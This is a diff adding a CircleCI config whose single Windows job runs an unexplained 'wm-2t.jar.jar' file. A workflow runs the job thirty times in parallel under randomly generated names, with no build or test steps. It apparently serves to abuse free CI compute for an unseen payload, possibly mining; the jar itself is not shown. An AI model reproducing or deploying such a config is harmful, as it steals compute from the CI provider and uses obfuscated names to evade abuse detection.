@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  JOB198434der:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: compresssuper267475
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  LOGOUTIOUS64786:
+    jobs:
+      - JOB198434der:
+          name: guardTEST566603
+      - JOB198434der:
+          name: WATCH58BASE598
+      - JOB198434der:
+          name: SECURE37line4135
+      - JOB198434der:
+          name: INITmeta290330
+      - JOB198434der:
+          name: resume149369AR
+      - JOB198434der:
+          name: appEDGE466462
+      - JOB198434der:
+          name: VALID22NER7829
+      - JOB198434der:
+          name: testmonitor21975
+      - JOB198434der:
+          name: encrypt57ive9698
+      - JOB198434der:
+          name: SCANflow221235
+      - JOB198434der:
+          name: SESSIONpipe750729
+      - JOB198434der:
+          name: BASE768877net
+      - JOB198434der:
+          name: watchPROD945972
+      - JOB198434der:
+          name: formatlocal319235
+      - JOB198434der:
+          name: encode325372CER
+      - JOB198434der:
+          name: POOLwer391246
+      - JOB198434der:
+          name: BASEPER119211
+      - JOB198434der:
+          name: pipePHASE990003
+      - JOB198434der:
+          name: TOKEN411810JOB
+      - JOB198434der:
+          name: createtest525888
+      - JOB198434der:
+          name: ENCRYPTLINE996413
+      - JOB198434der:
+          name: queueGER853531
+      - JOB198434der:
+          name: handle430875DER
+      - JOB198434der:
+          name: ASYNC650523UR
+      - JOB198434der:
+          name: srvSUPER507268
+      - JOB198434der:
+          name: EXEC406401APP
+      - JOB198434der:
+          name: aryGATEWAY683115
+      - JOB198434der:
+          name: WERENCRYPT135817
+      - JOB198434der:
+          name: task36ger1566
+      - JOB198434der:
+          name: secureSRV136674
